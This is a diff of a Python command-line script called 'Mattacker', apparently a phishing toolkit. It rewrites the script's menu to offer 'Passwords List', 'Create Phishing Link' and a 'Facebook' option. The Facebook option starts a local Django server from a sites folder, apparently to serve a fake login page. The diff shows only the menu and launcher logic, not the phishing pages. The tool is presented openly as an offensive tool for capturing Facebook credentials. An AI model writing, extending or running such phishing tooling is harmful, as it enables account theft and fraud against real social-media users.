@@ -41,14 +41,55 @@ print(colored("\nhttps://github.com/moosa-raheel","light_blue"))
 os.system("clear")
 welcome = "  Mattacker  "
 heading = welcome.center(len(welcome)+16, "*")
-print(colored(heading,"cyan"))
-print(colored("\n\n1) ","yellow"),colored("Facebook\n\n","green"))
+print("\n"+colored(heading,"cyan")+"\n")
 
-print(colored("Enter your choice : ","red"),end=" ")
+def link():
+    print(colored("\nchoose your plattform\n","cyan"))
+    print(colored("1) ","yellow"),colored("Facebook","green"))
+    print(colored("2) ","yellow"),colored("Exit","green"))
+    
+    while True:
+        print(colored("\nEnter your choice : ","red"),end=" ")
+        choice = input()
+        try:
+            choice = int(choice)
+        except:
+            print(colored("\nInvalid Input......\n","red"))
+            continue
+        if(choice==1):
+            if platform == "win32":
+                os.system("python sites/manage.py runserver")
+            else:
+                os.system("python3 sites/manage.py runserver")
+            exit()
+        elif(choice==2):
+            exit()
+        else:
+            print(colored("\nInvalid Input......\n","red"))
+            
+            
+print(colored("1) ","yellow"),colored("Passwords List","green"))
+print(colored("2) ","yellow"),colored("Create Phishing Link","green"))
+print(colored("3) ","yellow"),colored("Exit\n","green"))
 
-choice = int(input())
-if(choice==1):
-    if platform == "win32":
-        os.system("python sites/manage.py runserver")
+
+while True:
+    print(colored("Enter your choice : ","yellow"),end="")
+    ch = input()
+    try:
+        ch = int(ch)
+    except:
+        print(colored("\nInvalid Input......\n","red"))
+        continue
+    
+    if ch==1:
+        print("password list")
+        break
+    elif ch==2:
+        link()
+        break
+    elif ch==3:
+        exit()
     else:
-        os.system("python3 sites/manage.py runserver")
+        print(colored("\nInvalid Input......\n","red"))
+
